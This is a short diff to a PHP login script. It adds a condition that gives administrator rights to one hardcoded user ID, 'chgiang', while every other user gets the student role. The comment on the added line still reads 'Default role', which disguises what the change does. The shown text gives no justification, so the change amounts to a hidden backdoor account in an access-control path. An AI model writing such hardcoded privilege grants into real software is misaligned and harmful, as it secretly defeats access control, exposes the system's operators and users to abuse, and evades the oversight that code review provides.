@@ -27,6 +27,9 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
         $_SESSION['name'] = $user['name']; // Name
         $_SESSION['role'] = 'student'; // Default role
 
+        if ($student_id =='chgiang')
+            $_SESSION['role'] = 'admin'; // Default role
+
         // Redirect
         header("Location: index.php");
         exit;
